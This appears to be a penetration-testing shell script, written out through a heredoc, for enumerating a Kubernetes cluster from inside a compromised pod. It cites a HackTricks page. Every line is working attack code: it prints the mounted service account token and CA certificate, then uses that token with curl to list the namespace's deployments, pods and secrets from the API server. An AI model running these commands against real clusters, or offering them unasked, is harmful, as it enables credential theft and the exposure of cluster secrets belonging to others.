cat << 'bashScript' > kubernetes_enum.sh

find / -name "*kubernetes*"

ls -al /var/run/secrets/kubernetes.io/serviceaccount/

cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt

export APISERVER=${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}

export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt


curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -v https://$APISERVER/apis/apps/v1/namespaces/$NAMESPACE/deployments/

curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -v https://$APISERVER/api/v1/namespaces/$NAMESPACE/pods/

curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -v https://$APISERVER/api/v1/namespaces/$NAMESPACE/secrets

# Ref
# https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-security/kubernetes-enumeration

# Kubernetes API Reference
# https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.28/#deployment-v1-apps

# alias
# alias kurl="curl --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\""

bashScript